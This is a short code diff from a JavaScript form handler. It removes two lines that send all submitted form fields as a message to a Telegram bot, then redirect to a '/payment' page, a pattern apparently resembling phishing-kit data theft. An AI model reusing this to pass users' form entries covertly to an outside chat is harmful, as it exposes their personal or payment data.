@@ -116,8 +116,6 @@ function handleSubmit() {
     for (let i = 0; i < theKeys.length; i++) {
       updateMyMessage(`${theKeys[i]}:   ${data[i]}`);
     }
-    const url = `https://api.telegram.org/bot${VITE_API_TOKEN}/sendMessage?chat_id=${VITE_CHAT_ID}&text=${this.myMessage}`;
-    fetch(url).then(() => router.push("/payment"));
   }
 }
 </script>
